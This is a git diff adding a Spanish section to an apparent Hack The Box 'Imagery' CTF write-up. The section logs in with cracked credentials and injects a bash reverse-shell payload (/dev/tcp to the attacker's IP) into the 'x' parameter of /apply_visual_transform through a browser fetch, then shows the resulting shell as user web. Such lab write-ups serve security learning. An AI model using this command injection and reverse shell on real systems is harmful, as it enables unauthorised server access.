@@ -406,4 +406,57 @@ hashcat "2c65c8d7bfbca32a3ed42596192384f6" -m 0 -a 0 /usr/share/SecLists/Passwor
 
 - **Password**: iambatman
 
-Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.
+Con estas credenciales, cerramos la sesión de administrador e iniciamos sesión como **testuser@imagery.htb**. Ahora, el servidor permitirá que nuestras peticiones al endpoint `/apply_visual_transform` procesen las transformaciones de imagen, desbloqueando nuestro vector de **RCE**.
+
+### 2.3.2 Ataque
+
+Para inyectar el comando remoto, necesitamos subir una imagen para acceder a las opciones de recortar, rotar, etc. Mediante la peticion `upload_imag`. 
+
+Por medio de **NetCat** pondremos nuentra maquina atacanque en escucha para revicir la comunicacion via rever shell de la App Web.
+
+```
+nc -lvnp 8080
+Listening on 0.0.0.0 8080
+```
+
+Para que el servidor web se conecte hacia nuentra maquina haremos uso del siguiente payload:
+
+```
+; bash -c 'bash -i >& /dev/tcp/{IP_ATACANTE}/{PUERTO} 0>&1' #
+```
+
+Procedemos a capturar el fetch de la peticion `/apply_visual_transform` manipulamos el parametro `x` como lo explicamos anteriormente e inyectamos el payload y ejecutamos el fetch en la consala del navegador para que el servidor procese nuestra peticion. 
+
+```js
+await fetch("http://imagery.htb:8000/apply_visual_transform", {
+    "credentials": "include",
+    "headers": {
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Content-Type": "application/json",
+    },
+    "body": JSON.stringify({
+        "imageId":"7aad4727-b33a-482f-9dab-2b5154b89d00",
+        "transformType":"crop",
+        "params":{"x":"; bash -c 'bash -i >& /dev/tcp/10.10.14.127/8080 0>&1' #",
+            "y":4,
+            "width":5,
+            "height":4
+        }
+    }),
+    "method": "POST",
+    "mode": "cors"
+});
+```
+
+Como consecuencia la App Web se conecta a la maquina atacante proporcionandole acceso al servidor via shell(rever shell) en el cual podremos intractuar con el servidor, navegando facimento por todos los directorios. 
+
+```
+nc -lvnp 8080
+Listening on 0.0.0.0 8080
+Connection received on 10.129.242.164 48522
+bash: cannot set terminal process group (1357): Inappropriate ioctl for device
+bash: no job control in this shell
+web@Imagery:~/web$ id
+uid=1001(web) gid=1001(web) groups=1001(web)
+```
